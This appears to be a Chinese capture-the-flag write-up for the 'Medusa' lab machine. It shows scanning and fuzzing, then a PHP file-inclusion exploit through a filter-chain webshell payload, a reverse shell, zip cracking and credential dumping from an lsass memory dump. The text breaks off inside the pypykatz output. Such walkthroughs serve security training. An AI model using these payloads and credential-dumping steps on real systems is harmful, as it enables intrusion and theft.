# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 10:21 EDT
Nmap scan report for 192.168.21.1
Host is up (0.0018s latency).
MAC Address: CC:E0:DA:EB:34:A2 (Baidu Online Network Technology (Beijing))
Nmap scan report for 192.168.21.2
Host is up (0.053s latency).
MAC Address: C2:AB:39:9E:98:94 (Unknown)
Nmap scan report for 192.168.21.3
Host is up (0.00024s latency).
MAC Address: 04:6C:59:BD:33:50 (Intel Corporate)
Nmap scan report for 192.168.21.6
Host is up (0.00051s latency).
MAC Address: 08:00:27:C8:B5:16 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.10
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 4.73 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.21.6 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 10:21 EDT
Nmap scan report for 192.168.21.6
Host is up (0.000066s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:C8:B5:16 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.69 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sT -sV -O -p21,22,80 192.168.21.6
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 10:22 EDT
Nmap scan report for 192.168.21.6
Host is up (0.00034s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
MAC Address: 08:00:27:C8:B5:16 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.75 seconds
```

# 漏洞利用

看一下80端口

<img width="1178" height="783" alt="图片" src="https://github.com/user-attachments/assets/8e68d11f-28ee-424e-bafd-75ffa1d06fe5" />

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.6 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,txt,php,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.6
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,png,zip,git,html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10674]
/.html                (Status: 403) [Size: 277]
/manual               (Status: 301) [Size: 313] [--> http://192.168.21.6/manual/]                                               
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/hades                (Status: 301) [Size: 312] [--> http://192.168.21.6/hades/]                                                
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 277]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

更深的目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.6/hades -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,txt,php,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.6/hades
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,zip,git,html,txt,php,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 0]
/door.php             (Status: 200) [Size: 555]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 277]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

/hades/door.php

<img width="626" height="173" alt="图片" src="https://github.com/user-attachments/assets/186e5a28-c3d2-45a7-8722-475f9d87c26b" />

尝试看一下有什么

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.6/hades/door.php -X POST
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    
    <title>Door</title>
</head>
<body>
 <form action="d00r_validation.php" method="POST">
    <label for="word">Please enter the magic word...</label>
    <input id="word" type="text" required maxlength="6" name="word">
    <input type="submit" value="submit">
 </form>
</body>
</html>
```

尝试模糊测试没有出来结果

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.21.6/hades/door.php" -X POST -d "word=FUZZ" -w /usr/share/wordlists/rockyou.txt -fc 403 -c -fs 0,555 -s
```

在页面发现有这么一句话

<img width="818" height="131" alt="图片" src="https://github.com/user-attachments/assets/56dd276b-05b6-4091-8dd5-8a12dfcab174" />

尝试一下

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.6/hades/door.php -X POST -d "word=Kraken"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    
    <title>Door</title>
</head>
<body>
 <form action="d00r_validation.php" method="POST">
    <label for="word">Please enter the magic word...</label>
    <input id="word" type="text" required maxlength="6" name="word">
    <input type="submit" value="submit">
 </form>
</body>
</html>
                                                                
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.6/hades/d00r_validation.php -X POST -d "word=Kraken"
<head>
    <link rel="stylesheet" href="styles.css">
    <title>Validation</title>
</head>
<source><marquee>medusa.hmv</marquee></source>
```

尝试一下dns解析

```
192.168.21.6    medusa.hmv
```

访问没啥变化，尝试模糊测试

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://medusa.hmv" -H "Host: FUZZ.medusa.hmv" -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fc 403 -c -fs 0,10674 -s 
dev
```

添加一下

```
192.168.21.6    dev.medusa.hmv
```

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://dev.medusa.hmv -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.medusa.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,jpg,png,zip,git
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 1973]
/.html                (Status: 403) [Size: 279]
/files                (Status: 301) [Size: 316] [--> http://dev.medusa.hmv/files/]                                              
/assets               (Status: 301) [Size: 317] [--> http://dev.medusa.hmv/assets/]                                             
/css                  (Status: 301) [Size: 314] [--> http://dev.medusa.hmv/css/]                                                
/manual               (Status: 301) [Size: 317] [--> http://dev.medusa.hmv/manual/]                                             
/robots.txt           (Status: 200) [Size: 489]
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 279]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
┌──(kali㉿kali)-[~]
└─$ curl http://dev.medusa.hmv/files/readme.txt
-----------------------------------------------
+  Don't trust your eyes, trust your instinct +
-----------------------------------------------
                                                                
┌──(kali㉿kali)-[~]
└─$ curl http://dev.medusa.hmv/files//system.php
```

模糊测试

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd -w  SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -fc 403 -c -fs 0 -s
view
```

查看一下system.php源码

```
┌──(kali㉿kali)-[~]
└─$ curl http://dev.medusa.hmv/files/system.php?view=php://filter/convert.base64-encode/resource=system.php
PD9waHAKCiRmaWxlID0gJF9HRVRbJ3ZpZXcnXTsKaWYoaXNzZXQoJGZpbGUpKQoKewoKaW5jbHVkZSgiJGZpbGUiKTsKCn0KCmVsc2UKCnsKCmluY2x1ZGUoImluZGV4LnBocCIpOwoKfQo/Pgo=
<?php

$file = $_GET['view'];
if(isset($file))

{

include("$file");

}

else

{

include("index.php");

}
?>
```

使用一下php_filter_chain_generator.py（https://github.com/synacktiv/php_filter_chain_generator）

```
┌──(kali㉿kali)-[~]
└─$ python php_filter_chain_generator.py --chain '<?php system($_GET[1]);?>'
[+] The following gadget chain will generate the following code : <?php system($_GET[1]);?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

<img width="1032" height="215" alt="图片" src="https://github.com/user-attachments/assets/4613b4ca-f468-427b-93e9-c0c938a30e5e" />

反弹一个shell

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.21.10] from (UNKNOWN) [192.168.21.6] 37906
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

看一下都有什么

```
www-data@medusa:/var/www/dev/files$ sudo -l
sudo -l
sudo: unable to resolve host medusa: Name or service not known

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 

Sorry, try again.
www-data@medusa:/var/www/dev/files$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/su
www-data@medusa:/var/www/dev/files$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
spectre:x:1000:1000:spectre,,,:/home/spectre:/bin/bash
www-data@medusa:/home/spectre$ cd /
cd /
www-data@medusa:/$ ls -la
ls -la
total 72
drwxr-xr-x  19 root root  4096 Jan 15  2023 .
drwxr-xr-x  19 root root  4096 Jan 15  2023 ..
drwxr-xr-x   2 root root  4096 Jan 18  2023 ...
lrwxrwxrwx   1 root root     7 Jan 15  2023 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Jan 15  2023 boot
drwxr-xr-x  17 root root  3140 Jul 22 10:20 dev
drwxr-xr-x  71 root root  4096 Jul 22 10:21 etc
drwxr-xr-x   3 root root  4096 Jan 15  2023 home
lrwxrwxrwx   1 root root    31 Jan 15  2023 initrd.img -> boot/initrd.img-5.10.0-20-amd64
lrwxrwxrwx   1 root root    31 Jan 15  2023 initrd.img.old -> boot/initrd.img-5.10.0-18-amd64
lrwxrwxrwx   1 root root     7 Jan 15  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Jan 15  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Jan 15  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Jan 15  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 Jan 15  2023 lost+found
drwxr-xr-x   3 root root  4096 Jan 15  2023 media
drwxr-xr-x   2 root root  4096 Jan 15  2023 mnt
drwxr-xr-x   2 root root  4096 Jan 15  2023 opt
dr-xr-xr-x 146 root root     0 Jul 22 10:20 proc
drwx------   3 root root  4096 Jan 30  2023 root
drwxr-xr-x  19 root root   540 Jul 22 10:21 run
lrwxrwxrwx   1 root root     8 Jan 15  2023 sbin -> usr/sbin
drwxr-xr-x   3 root root  4096 Jan 15  2023 srv
dr-xr-xr-x  13 root root     0 Jul 22 10:20 sys
drwxrwxrwt   2 root root  4096 Jul 22 10:20 tmp
drwxr-xr-x  14 root root  4096 Jan 15  2023 usr
drwxr-xr-x  12 root root  4096 Jan 15  2023 var
lrwxrwxrwx   1 root root    28 Jan 15  2023 vmlinuz -> boot/vmlinuz-5.10.0-20-amd64
lrwxrwxrwx   1 root root    28 Jan 15  2023 vmlinuz.old -> boot/vmlinuz-5.10.0-18-amd64
www-data@medusa:/$ cd ...
cd ...
www-data@medusa:/...$ ls -la
ls -la
total 12108
drwxr-xr-x  2 root     root         4096 Jan 18  2023 .
drwxr-xr-x 19 root     root         4096 Jan 15  2023 ..
-rw-------  1 www-data www-data 12387024 Jan 18  2023 old_files.zip
```

找到了一个压缩包，传过来破解一下

```
┌──(kali㉿kali)-[~]
└─$ zip2john old_files.zip > hash
                                                                
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Cost 1 (HMAC size) is 12386830 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
medusa666        (old_files.zip/lsass.DMP)     
1g 0:00:01:25 DONE (2025-07-22 13:30) 0.01164g/s 65936p/s 65936c/s 65936C/s megan0308..medabe15
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

使用pypykatz查看一下DMP文件

```
┌──(kali㉿kali)-[~]
└─$ pypykatz lsa minidump lsass.DMP 
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 2261421 (2281ad)
session_id 18
username avijneyam
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T14:05:20.008398+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1016
luid 2261421
 == MSV ==
  Username: avijneyam
  Domain: Medusa-PC
  LM: 009c022933c34479477921681300160c
  NT: af71862c10235568287670ca23484fe5
  SHA1: 3c9943f1b81e5cdab6cd00d694f8ddd19a079893
  DPAPI: NA
 == WDIGEST [2281ad]==
  username avijneyam
  domainname Medusa-PC
  password 4v1jn3y4m_zxc
  password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000
 == Kerberos ==
  Username: avijneyam
  Domain: Medusa-PC
  Password: 4v1jn3y4m_zxc
  password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000
 == WDIGEST [2281ad]==
  username avijneyam
  domainname Medusa-PC
  password 4v1jn3y4m_zxc
  password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000
 == TSPKG [2281ad]==
  username avijneyam
  domainname Medusa-PC
  password 4v1jn3y4m_zxc
  password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000

== LogonSession ==
authentication_id 2167111 (211147)
session_id 17
username shelldredd
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T14:04:31.112890+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1009
luid 2167111
 == MSV ==
  Username: shelldredd
  Domain: Medusa-PC
  LM: eed81a9f101536a4abb659e51581b7d4
  NT: 4a88b7b647b8832ddd0660ec101c7471
  SHA1: e2b9a8a7a676bad2060ee2b57cd497ae11d599f9
  DPAPI: NA
 == WDIGEST [211147]==
  username shelldredd
  domainname Medusa-PC
  password t0p_s3cr3t
  password (hex)7400300070005f0073003300630072003300740000000000
 == Kerberos ==
  Username: shelldredd
  Domain: Medusa-PC
  Password: t0p_s3cr3t
  password (hex)7400300070005f0073003300630072003300740000000000
 == WDIGEST [211147]==
  username shelldredd
  domainname Medusa-PC
  password t0p_s3cr3t
  password (hex)7400300070005f0073003300630072003300740000000000
 == TSPKG [211147]==
  username shelldredd
  domainname Medusa-PC
  password t0p_s3cr3t
  password (hex)7400300070005f0073003300630072003300740000000000

== LogonSession ==
authentication_id 2072766 (1fa0be)
session_id 16
username powerful
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T14:04:05.978125+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1012
luid 2072766
 == MSV ==
  Username: powerful
  Domain: Medusa-PC
  LM: 8657a86693ce10c313cb02d141696a00
  NT: 9b05a607cfb0b59176092be732b6b814
  SHA1: f2197be95bf11a3dc2f494b1a20814a3a27bd420
  DPAPI: NA
 == WDIGEST [1fa0be]==
  username powerful
  domainname Medusa-PC
  password p0w3rf1ll_abc
  password (hex)70003000770033007200660031006c006c005f00610062006300000000000000
 == Kerberos ==
  Username: powerful
  Domain: Medusa-PC
  Password: p0w3rf1ll_abc
  password (hex)70003000770033007200660031006c006c005f00610062006300000000000000
 == WDIGEST [1fa0be]==
  username powerful
  domainname Medusa-PC
  password p0w3rf1ll_abc
  password (hex)70003000770033007200660031006c006c005f00610062006300000000000000
 == TSPKG [1fa0be]==
  username powerful
  domainname Medusa-PC
  password p0w3rf1ll_abc
  password (hex)70003000770033007200660031006c006c005f00610062006300000000000000

== LogonSession ==
authentication_id 1977311 (1e2bdf)
session_id 15
username alienum
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T14:03:15.227148+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1018
luid 1977311
 == MSV ==
  Username: alienum
  Domain: Medusa-PC
  LM: ca68f3f2af89ee409b93859eb9628cfa
  NT: f430978744f1846424852b47c4ee8a10
  SHA1: 4c8c55d87f86d95146afd0fe1437d1d71384a15f
  DPAPI: NA
 == WDIGEST [1e2bdf]==
  username alienum
  domainname Medusa-PC
  password 4l13num_qwerty
  password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000
 == Kerberos ==
  Username: alienum
  Domain: Medusa-PC
  Password: 4l13num_qwerty
  password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000
 == WDIGEST [1e2bdf]==
  username alienum
  domainname Medusa-PC
  password 4l13num_qwerty
  password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000
 == TSPKG [1e2bdf]==
  username alienum
  domainname Medusa-PC
  password 4l13num_qwerty
  password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000

== LogonSession ==
authentication_id 1881308 (1cb4dc)
session_id 14
username Claor
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T14:02:32.235938+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1006
luid 1881308
 == MSV ==
  Username: Claor
  Domain: Medusa-PC
  LM: NA
  NT: 7f62b734f90db005c14454d0e7982bf2
  SHA1: 70cb75925c8a0b5825faaa344e9252ba9c23fa41
  DPAPI: NA
 == WDIGEST [1cb4dc]==
  username Claor
  domainname Medusa-PC
  password n0s_v0lv1m0s_4_1lusi0n4r
  password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200
 == Kerberos ==
  Username: Claor
  Domain: Medusa-PC
  Password: n0s_v0lv1m0s_4_1lusi0n4r
  password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200
 == WDIGEST [1cb4dc]==
  username Claor
  domainname Medusa-PC
  password n0s_v0lv1m0s_4_1lusi0n4r
  password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200
 == TSPKG [1cb4dc]==
  username Claor
  domainname Medusa-PC
  password n0s_v0lv1m0s_4_1lusi0n4r
  password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200

== LogonSession ==
authentication_id 1785900 (1b402c)
session_id 13
username Pr0xy
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T14:01:16.137305+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1017
luid 1785900
 == MSV ==
  Username: Pr0xy
  Domain: Medusa-PC
  LM: NA
  NT: ba26a9d6f4cf057e1652257963729d49
  SHA1: 802991035ea1acf65584c004f34a72902a0e609c
  DPAPI: NA
 == WDIGEST [1b402c]==
  username Pr0xy
  domainname Medusa-PC
  password pr0xy_ch41ns_456
  password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600
 == Kerberos ==
  Username: Pr0xy
  Domain: Medusa-PC
  Password: pr0xy_ch41ns_456
  password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600
 == WDIGEST [1b402c]==
  username Pr0xy
  domainname Medusa-PC
  password pr0xy_ch41ns_456
  password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600
 == TSPKG [1b402c]==
  username Pr0xy
  domainname Medusa-PC
  password pr0xy_ch41ns_456
  password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600

== LogonSession ==
authentication_id 1692880 (19d4d0)
session_id 12
username nolo
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T14:00:28.298438+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1019
luid 1692880
 == MSV ==
  Username: nolo
  Domain: Medusa-PC
  LM: 580bb7781b7384e43463667f1a71e97a
  NT: d54fc8d1a368eab7bee473b8c7b93748
  SHA1: 50908cf3b351621d70f7e55e9ca92c37b0a5990d
  DPAPI: NA
 == WDIGEST [19d4d0]==
  username nolo
  domainname Medusa-PC
  password littl3_h4ck3r
  password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000
 == Kerberos ==
  Username: nolo
  Domain: Medusa-PC
  Password: littl3_h4ck3r
